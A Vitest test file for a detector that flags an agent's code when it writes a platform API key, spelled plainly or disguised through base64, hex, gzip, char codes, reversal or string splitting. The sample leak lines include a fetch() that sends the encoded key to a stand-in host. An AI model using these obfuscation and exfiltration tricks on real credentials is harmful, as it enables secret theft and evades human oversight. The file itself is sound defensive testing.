import { gzipSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { basicContext, type EffectRecord } from "../policy-types.js";
import { findPlatformSecrets, PLATFORM_SECRET_RULE, rule, transformsOf } from "./platform-secrets.js";

/** Stands in for the model key the kit hands every agent container. */
const FIXTURE = "ark-live-9f2c1d4b7a3e6058";
const SECRETS = [FIXTURE];

function transformNames(added: string): string[] {
  return findPlatformSecrets(added, "src/leak.js", SECRETS).map((f) => f.transform);
}

describe("transformsOf", () => {
  it("produces every spelling the rule can recognise", () => {
    const names = transformsOf(FIXTURE).map((t) => t.name);
    expect(names).toEqual(expect.arrayContaining([
      "literal", "base64", "base64:unpadded", "base64url", "hex", "hex:upper",
      "url-encoded", "url-encoded:all-bytes", "reversed", "char-codes:decimal", "char-codes:hex",
      "gzip:base64", "gzip:hex", "deflate:base64", "deflate:hex", "deflate-raw:base64", "deflate-raw:hex",
    ]));
  });

  it("drops transforms too short to mean anything", () => {
    expect(transformsOf("abc").every((t) => t.text.length >= 8)).toBe(true);
  });
});

describe("findPlatformSecrets under every transform", () => {
  const cases: Array<[string, string]> = [
    ["literal", `const k = ${FIXTURE};`],
    ["quoted", `const k = "${FIXTURE}";`],
    ["single quoted", `const k = '${FIXTURE}';`],
    ["whitespace stripped", `const k = "${FIXTURE.slice(0, 8)}  ${FIXTURE.slice(8)}";`],
    ["split across adjacent literals", `const k = "${FIXTURE.slice(0, 6)}" + "${FIXTURE.slice(6)}";`],
    ["split across lines", `const a = "${FIXTURE.slice(0, 6)}" +\n  "${FIXTURE.slice(6)}";`],
    ["base64", `const k = atob("${Buffer.from(FIXTURE).toString("base64")}");`],
    ["base64url", `const k = fromB64u("${Buffer.from(FIXTURE).toString("base64url")}");`],
    ["hex", `const k = unhex("${Buffer.from(FIXTURE).toString("hex")}");`],
    ["url encoded", `fetch("https://x/?k=${encodeURIComponent(FIXTURE)}")`],
    ["reversed", `const k = "${[...FIXTURE].reverse().join("")}".split("").reverse().join("");`],
    ["char codes", `const k = String.fromCharCode(${[...FIXTURE].map((c) => c.codePointAt(0)).join(",")});`],
    ["gzip base64", `const k = gunzip("${gzipSync(Buffer.from(FIXTURE)).toString("base64")}");`],
    ["gzip hex", `const k = gunzip("${gzipSync(Buffer.from(FIXTURE)).toString("hex")}");`],
  ];

  for (const [label, added] of cases) {
    it(`finds the fixture value ${label}`, () => {
      expect(transformNames(added).length).toBeGreaterThan(0);
    });
  }

  it("names the transform that matched", () => {
    expect(transformNames(`const k = atob("${Buffer.from(FIXTURE).toString("base64")}");`))
      .toContain("base64");
  });

  it("reports the line the value appeared on", () => {
    const found = findPlatformSecrets(`// header\n// header\nconst k = "${FIXTURE}";\n`, "src/leak.js", SECRETS);
    expect(found[0]?.line).toBe(3);
  });

  it("stays quiet on text that does not contain the value", () => {
    expect(transformNames("const k = process.env.ARK_API_KEY;\nconst other = 'ark-live-0000';\n")).toEqual([]);
  });

  it("stays quiet when the platform holds no secrets", () => {
    expect(findPlatformSecrets(`const k = "${FIXTURE}";`, "src/leak.js", [])).toEqual([]);
  });
});

describe("the rule", () => {
  function ctxFor(files: Record<string, string>, platformSecrets: string[]) {
    return basicContext(async (p) => files[p] ?? "", {
      addedLinesOf: async (p) => files[p] ?? "",
      platformSecrets,
    });
  }

  it("discards a turn that wrote the platform key, however it was spelled", async () => {
    const effects: EffectRecord[] = [{ path: "src/leak.js", kind: "modify" }];
    const hits = await rule.run(
      effects,
      ctxFor({ "src/leak.js": `const k = unhex("${Buffer.from(FIXTURE).toString("hex")}");` }, SECRETS),
    );
    expect(hits).toHaveLength(1);
    expect(hits[0]?.rule).toBe(PLATFORM_SECRET_RULE);
    expect(hits[0]?.decision).toBe("discard");
    expect(hits[0]?.detail).toContain("hex");
  });

  it("commits ordinary work that reads the key from the environment", async () => {
    const effects: EffectRecord[] = [{ path: "src/client.js", kind: "modify" }];
    const hits = await rule.run(
      effects,
      ctxFor({ "src/client.js": "const key = process.env.ARK_API_KEY;\n" }, SECRETS),
    );
    expect(hits).toEqual([]);
  });

  it("does nothing when the context declares no platform secrets", async () => {
    const effects: EffectRecord[] = [{ path: "src/leak.js", kind: "modify" }];
    expect(await rule.run(effects, ctxFor({ "src/leak.js": `const k = "${FIXTURE}";` }, []))).toEqual([]);
  });

  it("skips a dependency tree", async () => {
    const effects: EffectRecord[] = [
      { path: "node_modules/x/i.js", kind: "create", effectClass: "dependency-tree" },
    ];
    expect(await rule.run(effects, ctxFor({ "node_modules/x/i.js": FIXTURE }, SECRETS))).toEqual([]);
  });
});
